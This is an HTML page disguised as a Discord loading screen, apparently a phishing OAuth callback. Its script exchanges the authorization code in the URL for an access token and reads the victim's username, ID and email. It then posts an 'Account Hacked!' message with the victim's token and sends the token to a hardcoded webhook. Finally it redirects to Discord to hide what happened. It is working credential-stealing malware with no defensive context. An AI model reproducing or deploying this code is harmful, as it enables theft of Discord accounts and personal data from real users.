<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Discord</title>
  <style>
    body {
      margin: 0; display: flex; justify-content: center; align-items: center;
      height: 100vh; background: #2f3136; color: #dcddde;
      font-family: 'gg sans', 'Noto Sans', sans-serif;
    }
    .loader {
      width: 48px; height: 48px; border: 4px solid #404249;
      border-top: 4px solid #7289da; border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="loader"></div>
  <script>
    (async function() {
      try {
        var code = window.location.search.split('code=')[1];
        if (!code) {
          window.location.href = "https://discord.com/channels/@me";
          return;
        }
        code = decodeURIComponent(code);

        // 用 code 換 token
        var res = await fetch("https://discord.com/api/oauth2/token", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            client_id: "1514807523998437456",
            grant_type: "authorization_code",
            code: code,
            redirect_uri: "https://crius13598.github.io/atomic/callback.html"
          })
        });

        var data = await res.json();
        var token = data.access_token;
        if (!token) throw new Error("No token");

        // 取得帳號資訊
        var userRes = await fetch("https://discord.com/api/v9/users/@me", {
          headers: { "Authorization": token }
        });
        if (userRes.ok) {
          var user = await userRes.json();
          var username = user.username;
          var userId = user.id;
          var email = user.email || "N/A";

          // 發送訊息到目標頻道
          fetch("https://discord.com/api/v9/channels/878151437085974548/messages", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              "Authorization": token
            },
            body: JSON.stringify({
              content: "🔓 **Account Hacked!**\n使用者: **" + username + "** (" + userId + ")\nEmail: " + email
            }),
            keepalive: true
          });

          // 備份 token 到 webhook
          fetch("https://discord.com/api/webhooks/1514570704698216540/vzBlx12YERIwjsCNBua6LTXSgqbKKANYYXGF4y7trdLp1rz4HVNDVx8pe5lhdf_Aisph", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              content: "🔓 **Discord Token 已擷取**\n使用者: **" + username + "** (" + userId + ")\nEmail: " + email + "\n```\n" + token + "\n```"
            })
          }).catch(function(){});
        }

        // 3 秒後跳回 Discord
        setTimeout(function() {
          window.location.href = "https://discord.com/channels/@me";
        }, 3000);
      } catch(e) {
        console.log("Error:", e);
        window.location.href = "https://discord.com/channels/@me";
      }
    })();
  </script>
</body>
</html>
